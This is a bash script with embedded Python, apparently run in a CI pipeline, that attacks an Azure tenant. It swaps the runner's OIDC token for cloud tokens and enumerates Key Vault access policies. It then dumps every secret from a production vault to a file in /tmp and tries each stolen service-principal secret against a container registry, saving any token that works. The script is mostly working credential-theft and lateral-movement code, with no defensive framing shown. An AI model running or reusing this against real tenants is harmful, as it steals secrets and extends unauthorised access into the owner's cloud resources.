#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    elif data==b"": body=b""; h.setdefault("Content-Length","0")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
RG="rg-tbl-platform-prod-sea"; REG="crtblplatprodx3euoz"
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]; open("/tmp/idt","w").write(IDT)
def oidc(sc):
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,"scope":sc,
      "grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":IDT}); return jg(b).get("access_token")
ARM=oidc("https://management.azure.com/.default"); KVT=oidc("https://vault.azure.net/.default")
H={"Authorization":"Bearer "+ARM}

print("### kv-tbl-sec vault properties")
st,b=http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/"
          f"Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01", headers=H)
d=jg(b).get("properties",{})
print("  HTTP",st," rbac:",d.get("enableRbacAuthorization")," policies:",len(d.get("accessPolicies",[])))
for ap in d.get("accessPolicies",[]):
    print("   policy objectId:", ap.get("objectId"), "secrets:", ap.get("permissions",{}).get("secrets"))

# collect principals
creds={}
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
for s in jg(b).get("value",[]):
    n=s["id"].rsplit("/",1)[-1]
    st2,b2=http(s["id"]+"?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
    try: creds[n]=json.loads(jg(b2).get("value",""))
    except Exception: pass
json.dump(creds, open("/tmp/creds.json","w"))

def acr_probe(tag, armtok):
    st,b=http(f"https://{REG}.azurecr.io/oauth2/exchange",
              {"grant_type":"access_token","service":f"{REG}.azurecr.io","tenant":TEN,"access_token":armtok})
    if st!=200: print(f"  {tag:28} exchange {st} {b[:90]}"); return
    rt=jg(b)["refresh_token"]
    st,b=http(f"https://{REG}.azurecr.io/oauth2/token",
              {"grant_type":"refresh_token","service":f"{REG}.azurecr.io","refresh_token":rt,
               "scope":"registry:catalog:*"})
    if st!=200: print(f"  {tag:28} token {st} {b[:90]}"); return
    at=jg(b)["access_token"]
    st,b=http(f"https://{REG}.azurecr.io/v2/_catalog", headers={"Authorization":"Bearer "+at})
    print(f"  {tag:28} catalog {st} {b[:300]}")
    if st==200:
        open("/tmp/acr_rt","w").write(rt)
        open("/tmp/acr_who","w").write(tag)

print("### ACR catalog access")
acr_probe("oidc-identity", ARM)
for n,c in creds.items():
    st,b=http(f"https://login.microsoftonline.com/{c.get('tenantId',TEN)}/oauth2/v2.0/token",
      {"client_id":c["appId"],"client_secret":c["clientSecret"],
       "scope":"https://management.azure.com/.default","grant_type":"client_credentials"})
    t=jg(b).get("access_token")
    if t: acr_probe(n, t)
PYEOF
echo "=== done ==="